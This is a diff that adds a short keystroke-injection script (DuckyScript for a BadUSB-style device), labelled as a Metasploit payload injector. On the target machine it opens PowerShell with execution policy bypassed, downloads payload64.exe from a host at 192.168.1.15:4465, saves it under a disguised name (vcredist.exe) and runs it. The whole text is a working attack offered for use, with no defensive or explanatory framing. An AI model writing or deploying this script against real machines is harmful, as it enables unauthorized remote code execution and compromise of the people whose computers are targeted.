@@ -1,0 +1,12 @@
+REM Metasploit Payload Injector - Bypass Method
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -NoP -NonI -ExecutionPolicy Bypass
+ENTER
+DELAY 1500
+STRING iwr http://192.168.1.15:4465/payload64.exe -O $env:TEMP\vcredist.exe; Start-Process $env:TEMP\vcredist.exe
+ENTER
+DELAY 500
+STRING exit
+ENTER
